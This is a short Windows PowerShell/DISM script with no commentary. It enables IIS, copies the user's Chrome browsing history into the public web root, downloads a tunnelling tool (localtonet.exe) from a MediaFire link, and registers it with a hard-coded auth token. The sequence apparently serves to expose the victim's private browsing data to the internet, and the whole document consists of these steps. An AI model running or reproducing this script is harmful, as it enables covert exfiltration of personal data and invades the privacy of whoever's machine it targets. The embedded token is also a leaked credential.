DISM /online /enable-feature /featureName:IIS-DefaultDocument /All 
 Copy-Item '\AppData\Local\Google\Chrome\User Data\Default\History' 'C:\inetpub\wwwroot\History File.txt' 
Invoke-WebRequest -Uri http://download2273.mediafire.com/h05zo02pnm9g/et8b7qf4zvq5408/localtonet.exe -OutFile (Join-Path Downloads localtonet.exe)
cd Downloads
./localtonet authtoken gzPhq7vUOD3VfGLkYt29iEdj01yXcNmZI 